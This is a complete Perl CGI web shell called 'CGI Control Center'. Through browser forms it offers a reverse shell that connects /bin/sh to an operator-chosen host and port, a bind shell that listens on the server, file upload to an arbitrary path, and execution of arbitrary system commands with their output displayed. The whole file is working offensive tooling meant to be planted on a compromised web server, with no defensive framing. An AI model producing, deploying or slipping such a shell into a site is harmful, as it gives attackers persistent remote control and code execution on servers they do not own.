#!/usr/bin/perl

#
# (C) Copyright Claes M Nyberg <md0claes@mdstud.chalmers.se> 2004
# $Id: cgi_ctlcenter.pl,v 1.3 2007-11-12 15:03:09 cmn Exp $
#

use Socket;

$debug = 0;

sub sigchld
{
    wait();
    $SIG{CHLD} = \&sigchld;
    $gotsigchld = 1;
}


# Detach and connect back
# $_[0] - IP
# $_[1] - Port
# $_[2] - Program (/bin/sh)
sub bindsh($$$)
{
    socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'))  or
        return("socket(): $!");

    setsockopt(SOCK, SOL_SOCKET, SO_REUSEADDR, pack("l", 1)) or
        return("setsockopt(): $!");

    bind(SOCK, sockaddr_in($_[1], inet_aton($_[0]))) or
        return("bind(): $!");

    listen(SOCK, SOMAXCONN);

    # Detach daemon
    (fork() != 0) and return('');

    for (;;) {
        accept(CLIENT, SOCK);

        if ($gotsigchld eq 1) {
            $gotsigchld = 0;
            next;
        }

        if (fork() == 0) {
            open(STDIN, '>&CLIENT');
            open(STDOUT, '>&CLIENT');
            open(STDERR, '>&CLIENT');
            exec($_[2]);
            exit(1);
        }
        close(CLIENT);
    }

    exit(1);
}


# Detach and connect back
# $_[0] - IP
# $_[1] - Port
# $_[2] - Program (/bin/sh)
sub connect_back($$$)
{
	socket(TARGET, PF_INET, SOCK_STREAM, getprotobyname('tcp'))  or
		return("socket(): $!");

	connect(TARGET, sockaddr_in($_[1],inet_aton($_[0]))) or 
		return("connect(): $!");

	(fork() != 0) and return('');
	open(STDIN, '<&TARGET');
	open(STDOUT, '>&TARGET');
	open(STDERR, '>&TARGET');
	exec($_[2]);
	exit(1);
}

# Read and write file
sub retrieve_file()
{
    $len = int($ENV{'CONTENT_LENGTH'});
    $boundary = <STDIN>;
    $len -= length($boundary);
    $boundary = "\r\n" . $boundary;

    # Read data header
    while (<STDIN>) {
        $len -=length($_);

        # Cho(m)p newline
        s/\n//; s/\r//;

        ($_ eq '') and last;

        # Strip out source file name
        #if (/^Content-Disposition: /) {
        #   print "** GOT Content: $_\n";
        #}
    }

    # Read the posted data into memory
    # (and hope that there is enough space ...)
    if (read(STDIN, $buf, $len) != $len) {
        print("*** FATAL: Failed to read file: $!\n");
        exit(1);
    }
    @input = split(/$boundary/, $buf);

    # Get name of target file and open it
    if ($input[1] ne "") {
        @fields = split(/\n/, $input[1]);
        $destpath = $fields[$#fields-1];
    }

    # Open the target file and write the data
    if (open(DEST, ">$destpath") == 0) {
        print("*** FATAL: Failed to open file '$destpath': $!\n");
        exit(1);
    }

    binmode(DEST);
    print DEST $input[0];
    close(DEST);

    # We are done
    print "File <b>$destpath</b> uploaded.<br><br>\n";
    print "<a href=\"$ENV{'SCIPT_NAME'}\">back</a>\n";

    print "</body></html>";
    exit(1);
}

# Print environment and posted data
sub debug()
{
	($debug == 0) and return;

	print("<pre>\n-- DEBUG OUTPUT BELOW --\n");
	foreach $var (sort(keys(%ENV))) {
		$val = $ENV{$var};
		$val =~ s|\n|\\n|g;
		$val =~ s|"|\\"|g;
		print "${var}=\"${val}\"\n";
	}
	
	print "\n-- POST data follow --\n";
	while (<STDIN>) {
		print "$_";
	}
	print "\n-- POST data ended --\n";
	print("</pre>");
}

# get arguments into an associative array
sub get_post_args()
{
    while (<STDIN>) {
        # cho(m)p away newline
        s/\n//;
        s/\r//;
        @arr = split(/=/, $_);
        $args{$arr[0]} = $arr[1];
    }
    return(%args);
}

# Reopen standard error as standard out
open(STDERR, '>&STDOUT');

print<<__ENDHTML__;
Content-type: text/html\n\n
    <head><title>CGI Control Center</title></head>
    <html>
    <body>
	<center>
__ENDHTML__


# Get File (multipart/form-data)
($ENV{'CONTENT_TYPE'} =~ /^multipart\/form-data/) and
    retrieve_file();

%args = get_post_args();

# Connect back
if ( ($args{'cbip'} ne "") and ($args{'cbport'} ne "") and ($args{'cbprog'} ne "")) {
    $err = connect_back($args{'cbip'}, $args{'cbport'}, $args{'cbprog'});
	
	if ($err eq '') 
		{ print "Connected [<b>$args{'cbprog'}</b>] to <b>$args{'cbip'}:$args{'cbport'}</b>\n"; }
	else { print "Connect back failed: <b>$err</b>\n"; }
	
	print "<br><p><a href=\"$ENV{'SCIPT_NAME'}\">Back</a>\n";
	print "</body></html>";
	exit(0);
}

# Bind shell
if ( ($args{'bindip'} ne "") and ($args{'bindport'} ne "") and ($args{'bindprog'} ne "")) {
    $err = bindsh($args{'bindip'}, $args{'bindport'}, $args{'bindprog'});

    if ($err eq '')
        { print "[<b>$args{'bindprog'}</b>] listening on <b>$args{'bindip'}:$args{'bindport'}</b>\n"; }
    else { print "Daemon failed: <b>$err</b>\n"; }

    print "<br><p><a href=\"$ENV{'SCIPT_NAME'}\">Back</a>\n";
    print "</body></html>";
    exit(0);
}


print "<table bgcolor=gray>";
	
# Connect back
print "<form method=\"POST\" enctype=\"text/plain\" action=\"$ENV{'SCIPT_NAME'}\">";
print<<__ENDHTML__;
	<tr>
	<td>

		<table border="0" bgcolor="lightgray" height="140">
		<tr>
			<td>
			<b>Host</b><br> 
			<input name="cbip" type="text" size="20">
			</td>

			<td>
			<b>Port</b><br>
			<input name="cbport" type="text" size="5" maxsize="5">
			</td>
		</tr>
		<tr>
			<td colspan=2">
			<b>Program</b><br>
			<input name="cbprog" type="text" size="20" value="/bin/sh">
			</td>
		</tr>
		<tr>
			<td colspan="2">
			<br> <input type="submit" value="Connect Back">
			</td>
		</tr>
		</table>
    </td>

	</form>
__ENDHTML__


# Upload File
print "<form method=\"POST\" enctype=\"multipart/form-data\" action=\"$ENV{'SCIPT_NAME'}\">";
print<<__ENDHTML__;
    <td>
        <table border="0" bgcolor="lightgray" height="140">
        <tr>
            <td>
            <b>Source File</b><br>
            <input name="srcfile" type="file">
            </td>
        </tr>
        <tr>
            <td>
            <b>Destination File</b><br>
            <input name="destfile" type="text">
            </td>
        </tr>
        <tr>
            <td>
            <br> <input type="submit" value="Upload File">
            </td>
        </tr>
        </table>
    </td>
    </form>
	
	</td>
	</tr>
__ENDHTML__

print "<tr>\n";

# Bindshell
print "<form method=\"POST\" enctype=\"text/plain\" action=\"$ENV{'SCIPT_NAME'}\">";
print<<__ENDHTML__;
    <td>
        <table border="0" bgcolor="lightgray" height="140">
        <tr>
            <td>
            <b>IPv4 Address</b><br>
            <input name="bindip" type="text" size="20" value="0.0.0.0">
            </td>

            <td>
            <b>Port</b><br>
            <input name="bindport" type="text" size="5" maxsize="5">
            </td>
        </tr>
        <tr>
            <td colspan=2">
            <b>Program</b><br>
            <input name="bindprog" type="text" size="20" value="/bin/sh">
            </td>
        </tr>
        <tr>
            <td colspan="2">
            <br> <input type="submit" value="Bindshell">
            </td>
        </tr>
        </table>
    </td>
    </form>
	</td>
__ENDHTML__

# System command
print "<form method=\"POST\" enctype=\"text/plain\" action=\"$ENV{'SCIPT_NAME'}\">";
print<<__ENDHTML__;
    <td>
        <table border="0" bgcolor="lightgray" height=140>
        <tr>
            <td>
			<b>System Command</b><br>
            <input name="cmd" type="text" size="30" value="/bin/sh -c ' '">
            </td>
        </tr>
		<tr>
			<td>
			&nbsp;<br>
			&nbsp;<br>
			</td>
		</tr>
        <tr>
            <td>
            <br><input type="submit" value="Run Command">
            </td>
        </tr>
        </table>
    </td>
    </form>
	</td>
__ENDHTML__
print "</table></center>";

if ($args{'cmd'} ne "") {
    print "Command: <b>$args{'cmd'}</b><hr>";
    print "<pre>";
    open(CMD, "$args{'cmd'} |");
    while (<CMD>) {
        print "$_";
    }
    print "</pre>";
}

debug();

print "</body></html>";
